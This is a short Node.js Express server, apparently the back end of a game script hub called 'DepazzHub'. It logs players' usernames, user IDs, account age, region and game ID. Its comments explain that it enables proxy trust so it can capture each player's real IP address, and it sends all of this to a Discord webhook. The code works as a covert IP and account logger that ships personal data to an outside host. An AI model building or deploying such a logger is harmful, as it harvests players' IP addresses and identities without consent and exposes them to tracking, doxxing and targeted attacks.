const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(express.json());
app.use(cors());

// ⚠️ ESTA LÍNEA ES CLAVE: Permite que Render/Heroku obtenga la IP real del usuario
app.set('trust proxy', true);

const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;

app.post('/log', async (req, res) => {
    try {
        const { username, displayName, userId, gameId, accountAge, region } = req.body;
        
        // 🌐 Aquí capturamos la IP real del jugador que hizo la petición
        const clientIP = req.ip || req.connection.remoteAddress || 'N/A';

        const payload = {
            content: "🚀 **DepazzHub**",
            embeds: [{
                color: 3887359,
                fields: [
                    { name: "👤 Username", value: username || "Unknown", inline: true },
                    { name: "🏷️ Display Name", value: displayName || "N/A", inline: true },
                    { name: "🌐 IP Address", value: `\`${clientIP}\``, inline: true }, // <-- Campo de IP añadido
                    { name: "🎂 Account Age", value: accountAge || "N/A", inline: true },
                    { name: "🌍 Region", value: region ? region.toUpperCase() : "N/A", inline: true },
                    { name: "🆔 User ID", value: String(userId || "N/A"), inline: true },
                    { name: "🌐 Game ID", value: String(gameId || "N/A"), inline: false }
                ],
                footer: { text: "DepazzHub Logger" },
                timestamp: new Date().toISOString()
            }]
        };

        await axios.post(DISCORD_WEBHOOK, payload);
        res.status(200).json({ success: true });
    } catch (error) {
        console.error("Error:", error.message);
        res.status(500).json({ error: error.message });
    }
});

app.get('/', (req, res) => {
    res.json({ 
        status: "✅ API is running!",
        webhookConfigured: !!DISCORD_WEBHOOK
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
